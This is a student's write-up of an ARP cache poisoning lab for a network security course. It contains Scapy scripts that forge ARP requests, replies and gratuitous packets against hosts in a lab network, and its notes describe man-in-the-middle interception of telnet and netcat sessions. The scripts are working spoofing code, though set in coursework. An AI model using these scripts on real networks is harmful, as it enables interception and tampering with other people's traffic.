# ARP Cache Poisoning Attack Lab

## CNS Lab 3

### Aryansh Bhargavan

### PES1UG20CS084

---

#### Task 1 A

**Without ether**

>```py
>#!/usr/bin/python3
>
>from scapy.all import *
>
>arp= ARP( hwsrc = "02:42:0a:09:00:06",
>          psrc = "10.9.0.5",
>          hwdst = "02:42:0a:09:00:69",
>          pdst = "10.9.0.6" )
>ether = Ether()
>packet = ether/arp
>
>sendp(packet)
>```
>
>**Checking ARP Cache Before**
>
> ![image-20220910150324139](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220910150324139.png)![image-20220910150400576](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220910150400576.png)
>
>![image-20220910150535902](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220910150535902.png)
>
>**Checking ARP Cache after**
>
>![image-20220910150804448](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220910150804448.png)![image-20220910150814766](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220910150814766.png)
>
>on deleting
>
>![image-20220910151012009](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220910151012009.png)
>
>

#### **With ether**:

>```py
>#!/usr/bin/python3
>from scapy.all import *
>E = Ether(src = "02:42:0a:09:00:69",
>	  dst = "02:42:0a:09:00:05")
>A = ARP(hwsrc = "02:42:0a:09:00:69",
>   psrc = "10.9.0.6",
>   hwdst = "02:42:0a:09:00:05",
>   pdst = "10.9.0.5")
>pkt = E/A
>pkt.show()
>sendp(pkt)
>```
>
>
>
>![image-20220914111811472](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914111811472.png)
>
>
>
>![image-20220914111848509](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914111848509.png)
>
>on deleting:
>
>![image-20220914111927599](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914111927599.png)

- **`op` is used to specify if an arp reply or request is to be sent. It defaults to 1**
- **In the second case, reciever never finds actual IP of attacker since the source is set as attacker's MAC addr.**

---



#### Task 1 B

**Scenario 1**

>```py
>#!/usr/bin/python3
>from scapy.all import *
> 
>E = Ether(dst = '02:42:0a:09:00:05', 
>	src = '02:42:0a:09:00:69')
> 
>A = ARP(op=2,
>	hwsrc='02:42:0a:09:00:69',
>	psrc='10.9.0.6',
>	hwdst='02:42:0a:09:00:05', 
>	pdst='10.9.0.5')
> 
>pkt = E/A
>pkt.show()
>sendp(pkt)
>
>```
>
>**Executing** `task11A.py`:
>
>![image-20220914114118435](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914114118435.png)
>
>**Executing** `task1B.py`:
>
>![image-20220914114234380](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914114234380.png)

**Scenario 2**

>
>
>Deleting arp cache:
>
>![image-20220914111927599](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914111927599.png)
>
>**Executing** `task1B.py`:
>
>![image-20220914115203438](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914115203438.png)

- **ANS: op=2 means reply wil be sent**

---

#### Task 1 C

**Scenario 1**

>**Executing** `task1A.py`
>
>![image-20220914115557332](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914115557332.png)
>
>**Executing** `task1C.py`
>
>![image-20220914115848673](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914115848673.png)
>
>**Checking ARP Cache on**  `host-A` **and** `host-B`:
>
>![image-20220914120006309](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914120006309.png)



**Scenario 2**

>**Deleting ARP Cache**
>
>![image-20220914120308546](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914120308546.png)
>
>**Executing** `task1C.py`
>
>![image-20220914120706663](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914120706663.png)
>
>**Checking ARP Cache**
>
>![image-20220914120806058](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914120806058.png)![image-20220914120820930](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914120820930.png)



- **gratuitous packet only updates already existing values in ARP table so `host-B`'s cache remains empty** '

---

---

#### Task 2 MITM Attack on Telnet using ARP Cache Poisoning

##### - Launch the ARP cache poisoning attack

>**Check the ARP caches of Host A and Host B**
>
>![image-20220914191708211](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914191708211.png)
>
>**Executing task 1A (with ether)**
>
>![image-20220914192514041](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914192514041.png)
>
>**Executing task2**
>
>![image-20220914192709160](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914192709160.png)
>
>> B thinks A is attacker and A thinks B is attacker machine
>
>**Disabling IP Forwarding**
>
>![image-20220914192933013](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914192933013.png)
>
>**Pinging `host-B` from `host-A` **
>
>![image-20220914193122274](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914193122274.png)
>
>- **`host-A` is pinging `10.9.0.6` whose location we have put as the attacker's MAC, it recieves no reply so sends a broadcast to find `10.9.0.6`**
>
>**Enabling IP Forwarding**
>
>![image-20220914193927786](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914193927786.png)
>
>**Pinging `host-B` from `host-A` **
>
>![image-20220914194110344](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914194110344.png)
>
>- **attacker machine acts as man in the middle by recieving the ping from `host-A` and forwarding to`host-B`**

##### -  Launch the MITM Attack

>**Updating ARP Cache**
>
>![image-20220914195141209](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914195141209.png)
>
>**Turning on IP forwarding**
>
>![image-20220914195630755](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914195630755.png)
>
>**Telnet A to B**
>
>![image-20220914195836055](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914195836055.png)
>
>**Disable IP Forwarding**
>
>![image-20220914195940988](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914195940988.png)
>
>**Typing `ls` in telnet**
>
>![image-20220914200104104](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914200104104.png)

##### - Performing MITM attack

>**Refreshing ARP Cache and turning IP Forwarding on**
>
>![image-20220914200427523](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914200427523.png)
>
>**Telnet into `10.9.0.6`**
>
>![image-20220914200552328](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914200552328.png)
>
>**Turning off IP Forwarding**
>
>![image-20220914200613154](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914200613154.png)
>
>**Performing ARP Cache Refresh and MITM attack**
>
>![image-20220914200759614](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914200759614.png)
>
>![image-20220914200814912](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914200814912.png)
>
>![image-20220914201110174](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914201110174.png)

---

---

#### Task 3: MITM Attack on Netcat using ARP Cache Poisoning

##### Refreshing ARP Cache and turning on IP forwarding:

>![image-20220914201549923](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914201549923.png)

##### Starting netcat server on `host-B` and connecting to it on `host-A`

>![image-20220914201807349](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914201807349.png)
>
>![image-20220914201818709](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914201818709.png)

##### Performing MITM on `attacker`

>![image-20220914201946650](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914201946650.png)
>
>**Sending `aryans` on the nc server**
>
>![image-20220914202105589](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914202105589.png)
>
>**Response on `host-B` along with `attacker` shell visible**
>
>![image-20220914202135267](C:\Users\Aryansh\AppData\Roaming\Typora\typora-user-images\image-20220914202135267.png)

#### MITM successful

